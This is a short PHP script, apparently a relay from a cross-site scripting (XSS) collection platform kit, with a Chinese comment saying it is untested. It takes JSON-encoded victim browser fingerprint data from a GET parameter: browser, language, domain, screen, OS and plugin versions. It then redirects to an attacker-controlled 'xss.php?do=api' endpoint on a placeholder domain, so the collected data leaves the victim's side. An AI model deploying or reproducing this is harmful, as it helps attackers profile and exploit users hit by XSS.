<?php
//	【注意】【注意】【注意】 文件并未做测试，大家自测此文件。。
if (!empty($_GET["c"])) {
	$data = quotes($_GET["c"]);
	$ar_data = json_decode(urldecode($data), true);
	header("Location:http://替换成你的域名/xss.php?do=api&id={$_GET[id]}&browser_name={$ar_data[browser][name]}&browser_version={$ar_data[browser][version]}&language={$ar_data[lang]}&domain={$ar_data[domain]}&screen={$ar_data[screen]}&flash_version={$ar_data[flash]}&Osystem={$ar_data[system]}&java_version={$ar_data[java][0]}");
}
function quotes($content) {
	if (get_magic_quotes_gpc()) {
		if (is_array($content)) {
			foreach ($content as $key => $value) {
				$content[$key] = stripslashes($value);
			}
		} else {
			$content = stripslashes($content);
		}
	} else {
	}
	return $content;
}
?>